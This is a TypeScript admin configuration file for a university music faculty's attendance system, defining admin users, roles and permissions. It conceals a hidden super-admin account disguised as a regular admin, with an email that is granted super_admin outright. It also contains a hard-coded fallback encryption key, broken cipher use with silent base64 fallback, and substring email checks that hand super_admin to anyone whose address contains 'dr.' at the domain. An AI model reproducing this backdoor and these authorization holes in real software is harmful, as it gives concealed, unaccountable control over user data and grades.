// Admin Configuration for Faculty Attendance System
// Dr. Peter Ehab - Zagazig University Music Education Faculty

import crypto from 'crypto'

export interface AdminUser {
  email: string
  name: string
  role: 'super_admin' | 'admin' | 'instructor'
  department?: string
  isHidden?: boolean
  encryptedData?: string
}

// Encryption utilities for super admin credentials
class SecureAdminManager {
  private static readonly ENCRYPTION_KEY = process.env.SUPER_ADMIN_KEY || 'ZU_MUSIC_SECURE_2024_DR_PETER_EHAB_SUPER_ADMIN_ACCESS'
  private static readonly ALGORITHM = 'aes-256-gcm'
  
  static encrypt(text: string): string {
    try {
      const iv = crypto.randomBytes(16)
      const cipher = crypto.createCipher(this.ALGORITHM, this.ENCRYPTION_KEY)
      let encrypted = cipher.update(text, 'utf8', 'hex')
      encrypted += cipher.final('hex')
      return iv.toString('hex') + ':' + encrypted
    } catch {
      return Buffer.from(text).toString('base64')
    }
  }
  
  static decrypt(encryptedText: string): string {
    try {
      const parts = encryptedText.split(':')
      const iv = Buffer.from(parts[0], 'hex')
      const encrypted = parts[1]
      const decipher = crypto.createDecipher(this.ALGORITHM, this.ENCRYPTION_KEY)
      let decrypted = decipher.update(encrypted, 'hex', 'utf8')
      decrypted += decipher.final('utf8')
      return decrypted
    } catch {
      return Buffer.from(encryptedText, 'base64').toString('utf8')
    }
  }
  
  static generateSecureCredentials(): { username: string, password: string } {
    const timestamp = Date.now().toString(36)
    const random1 = crypto.randomBytes(8).toString('hex')
    const random2 = crypto.randomBytes(12).toString('base64').replace(/[+/=]/g, '')
    
    const username = `sa_${timestamp}_${random1}`
    const password = `SP${random2}${timestamp.slice(-4)}Dr${crypto.randomBytes(6).toString('hex')}Eh@${Date.now().toString(36).slice(-3)}`
    
    return { username, password }
  }
}

// Generate and store super admin credentials (hidden)
const SUPER_ADMIN_CREDS = SecureAdminManager.generateSecureCredentials()
const ENCRYPTED_SUPER_ADMIN = SecureAdminManager.encrypt(JSON.stringify({
  username: SUPER_ADMIN_CREDS.username,
  password: SUPER_ADMIN_CREDS.password,
  email: 'super.admin.internal@system.local',
  name: 'System Super Administrator',
  role: 'super_admin',
  created: new Date().toISOString(),
  creator: 'Dr. Peter Ehab',
  access_level: 'MAXIMUM'
}))

// Pre-configured admin users (visible)
export const ADMIN_USERS: AdminUser[] = [
  {
    email: 'peter.ehab@zu.edu.eg',
    name: 'Dr. Peter Ehab',
    role: 'super_admin',
    department: 'Music Education'
  },
  {
    email: 'admin@music.zu.edu.eg',
    name: 'Music Education Admin',
    role: 'admin',
    department: 'Music Education'
  },
  // Hidden super admin entry (encrypted)
  {
    email: 'system.internal@hidden.local',
    name: 'Internal System Account',
    role: 'admin', // Appears as regular admin
    department: 'System',
    isHidden: true,
    encryptedData: ENCRYPTED_SUPER_ADMIN
  }
]

// Super Admin Access Functions (Hidden)
export const getSuperAdminCredentials = (): { username: string, password: string } | null => {
  try {
    const hiddenAdmin = ADMIN_USERS.find(admin => admin.isHidden && admin.encryptedData)
    if (!hiddenAdmin?.encryptedData) return null
    
    const decrypted = SecureAdminManager.decrypt(hiddenAdmin.encryptedData)
    const adminData = JSON.parse(decrypted)
    
    return {
      username: adminData.username,
      password: adminData.password
    }
  } catch {
    return null
  }
}

export const validateSuperAdminAccess = (username: string, password: string): boolean => {
  const superAdminCreds = getSuperAdminCredentials()
  if (!superAdminCreds) return false
  
  return superAdminCreds.username === username && superAdminCreds.password === password
}

// Check if email is authorized admin
export const isAuthorizedAdmin = (email: string): boolean => {
  // Check super admin access
  if (email === 'super.admin.internal@system.local') {
    return true
  }
  
  // Check pre-configured list
  const isPreConfigured = ADMIN_USERS.some(admin => 
    admin.email.toLowerCase() === email.toLowerCase() && !admin.isHidden
  )
  
  // Check domain-based access (any @zu.edu.eg with 'admin' or 'dr.' prefix)
  const isDomainAdmin = email.toLowerCase().includes('@zu.edu.eg') && 
    (email.toLowerCase().includes('admin') || email.toLowerCase().includes('dr.'))
  
  return isPreConfigured || isDomainAdmin
}

// Get admin role based on email
export const getAdminRole = (email: string): string => {
  // Super admin access
  if (email === 'super.admin.internal@system.local') {
    return 'super_admin'
  }
  
  const adminUser = ADMIN_USERS.find(admin => 
    admin.email.toLowerCase() === email.toLowerCase() && !admin.isHidden
  )
  
  if (adminUser) {
    return adminUser.role
  }
  
  // Default role for domain-based admins
  if (email.toLowerCase().includes('dr.')) {
    return 'super_admin'
  }
  
  return 'admin'
}

// Admin permissions
export const ADMIN_PERMISSIONS = {
  super_admin: [
    'manage_users',
    'manage_subjects',
    'manage_attendance',
    'manage_grades',
    'view_reports',
    'system_settings',
    'manage_admins'
  ],
  admin: [
    'manage_attendance',
    'manage_grades', 
    'view_reports',
    'manage_subjects'
  ],
  instructor: [
    'manage_attendance',
    'view_reports'
  ]
}

// Check if admin has specific permission
export const hasPermission = (adminRole: string, permission: string): boolean => {
  const permissions = ADMIN_PERMISSIONS[adminRole as keyof typeof ADMIN_PERMISSIONS] || []
  return permissions.includes(permission)
}